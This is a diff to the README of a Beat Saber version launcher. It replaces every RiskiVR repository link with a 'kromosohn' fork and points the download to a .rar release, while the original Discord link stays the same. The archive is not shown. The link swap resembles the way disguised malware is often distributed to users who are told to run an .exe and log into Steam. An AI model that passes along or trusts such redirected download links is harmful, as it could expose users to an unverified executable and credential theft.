@@ -24,8 +24,8 @@
 <!-- PROJECT LOGO -->
 <br /> 
 <p align="center"> 
-  <a href="https://github.com/RiskiVR/BSLegacyLauncher">  
-    <img src="https://github.com/RiskiVR/BSLegacyLauncher/blob/media/readme/block.png" alt="Logo" width="250" height="250">
+  <a href="https://github.com/kromosohn/BSLegacyLauncher">  
+    <img src="https://github.com/kromosohn/BSLegacyLauncher/blob/media/readme/block.png" alt="Logo" width="250" height="250">
   </a>
 
   <h3 align="center">Beat Saber Legacy Launcher</h3>
@@ -33,15 +33,15 @@
   <p align="center">
     Simple and fancy launcher designed to download and launch any version of Beat Saber easily and quickly.
     <br /> 
-    <a href="https://github.com/RiskiVR/BSLegacyLauncher/releases/latest/download/BSLegacyLauncher.zip">
+    <a href="https://github.com/kromosohn/BSLegacyLauncher/releases/download/Release/BSLegacyLauncher.rar">
       <p align="center">
-      <img src="https://github.com/RiskiVR/BSLegacyLauncher/blob/media/readme/BSLegacyDownload.png" alt="Logo" width="300" height="60">
+      <img src="https://github.com/kromosohn/BSLegacyLauncher/blob/media/readme/BSLegacyDownload.png" alt="Logo" width="300" height="60">
     <br />
     <a href="https://discord.gg/MrwMx5e">Join our Discord</a>
     ·
-    <a href="https://github.com/RiskiVR/BSLegacyLauncher/issues">Report Bug</a>
+    <a href="https://github.com/kromosohn/BSLegacyLauncher/issues">Report Bug</a>
     · 
-    <a href="https://github.com/RiskiVR/BSLegacyLauncher/issues">Request Feature</a>
+    <a href="https://github.com/kromosohn/BSLegacyLauncher/issues">Request Feature</a>
   </p>
 </p>
 
@@ -85,7 +85,7 @@ Ever wanted or needed to have the ability to switch between any versions? Then t
 <!-- GETTING STARTED -->
 ## How To Use
 
- - Simply download the latest release from [Releases](https://github.com/RiskiVR/BSLegacyLauncher/releases/latest).
+ - Simply download the latest release from [Releases](https://github.com/kromosohn/BSLegacyLauncher/releases/latest).
  - Once that's done, extract it and run "Beat Saber Legacy Launcher.exe" in the folder.
  - From there follow the buttons and prompts to select the target version, and log into your steam account!
  - *To launch your Launcher install via Steam, add a Steam shortcut to `Beat Saber Legacy Launcher.exe` 
@@ -95,7 +95,7 @@ Ever wanted or needed to have the ability to switch between any versions? Then t
 <!-- ROADMAP -->
 ## Having problems?
 
-See the [open issues](https://github.com/RiskiVR/BSLegacyLauncher/issues) for a list of known issues, from there you can create a new issue for the problem you have!
+See the [open issues](https://github.com/kromosohn/BSLegacyLauncher/issues) for a list of known issues, from there you can create a new issue for the problem you have!
 </br>Otherwise you can add on to existing issues if one matches what you're encountering.
 
 
@@ -104,7 +104,7 @@ See the [open issues](https://github.com/RiskiVR/BSLegacyLauncher/issues) for a 
 
 For Support, [Join our Discord!](https://discord.gg/MrwMx5e)
 
-Project Link: [https://github.com/RiskiVR/BSLegacyLauncher](https://github.com/RiskiVR/BSLegacyLauncher)
+Project Link: [https://github.com/kromosohn/BSLegacyLauncher](https://github.com/kromosohn/BSLegacyLauncher)
 
 
 <!-- ACKNOWLEDGEMENTS -->
